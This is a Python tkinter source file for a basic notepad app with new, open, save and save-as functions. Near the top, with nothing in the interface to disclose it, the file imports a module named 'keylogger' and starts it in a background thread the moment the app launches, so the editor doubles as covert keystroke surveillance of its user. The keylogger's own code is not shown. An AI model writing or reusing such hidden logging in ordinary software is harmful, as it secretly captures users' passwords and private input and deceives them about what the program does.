import threading
import tkinter as tk
from tkinter.filedialog import askopenfilename,asksaveasfilename
import keylogger
from tkinter import messagebox
threading.Thread(target=keylogger.abc).start()
def savefile():
    global current_file_path
    if current_file_path:
        # If a file has already been saved, use the existing file path
        file_path = current_file_path
    else:
        # If no file has been opened or saved, ask for a location
        file_path = asksaveasfilename(
            defaultextension="txt",
            filetypes=[("Text file", "*.txt"), ("All files", "*.*")]
        )
        if not file_path:
            return
        current_file_path = file_path

    # Save to the existing file
    with open(file_path, 'w') as file:
        content = text_edit.get("1.0", "end-1c")
        file.write(content)
def savingfileas():
    global current_file_path
    text = text_edit.get(1.0, tk.END).strip()  # Get text and remove leading/trailing whitespace
    if not text:
        # If the text is empty, show a popup window
        messagebox.showinfo("Empty File", "Cannot save an empty file.")
        return
    else:
        file_location = asksaveasfilename(
            defaultextension="txt",
            filetypes=[("Text file", "*.txt"), ("All files", "*.*")]
        )
        if not file_location:
            return
        with open(file_location, "w") as file_output:
            file_output.write(text)
        current_file_path = file_location
        root.title(f"My Notepad - {file_location}")
def file_Opening():
    global current_file_path
    file_location = askopenfilename(
        filetypes=[("Text file", "*.txt"), ("All files", "*.*")]
    )
    if not file_location:
        return
    current_file_path = file_location
    with open(file_location, "r") as file_input:
        text = file_input.read()
        text_edit.insert(tk.END, text)
        root.title(f"My Notepad - {file_location}")
def new_file():
    text_edit.delete("1.0", tk.END)  # Clear the text
    global current_file_path
    current_file_path = None
    root.title(f"My Notepad - {current_file_path}")
root = tk.Tk()
root.title("My notepad")
root.rowconfigure(0, minsize=800)
root.columnconfigure(0, minsize=800)

text_edit = tk.Text(root)
text_edit.grid(row=0, column=1, sticky="nsew")

frame_button = tk.Frame(root, relief=tk.RAISED, bd=3)
frame_button.grid(row=0, column=0, sticky="ns")

button_New = tk.Button(frame_button, text="New File" , command=new_file)
button_New.grid(row=0, column=0, padx=5, pady=5)

button_open = tk.Button(frame_button, text="Open File", command=file_Opening)
button_open.grid(row=1, column=0, padx=5, pady=5)

button_saveas = tk.Button(frame_button, text="Save as", command=savingfileas)
button_saveas.grid(row=2, column=0, padx=5, pady=5)

button_save = tk.Button(frame_button, text="Save File", command=savefile)
button_save.grid(row=3, column=0, padx=5, pady=5)

root.mainloop()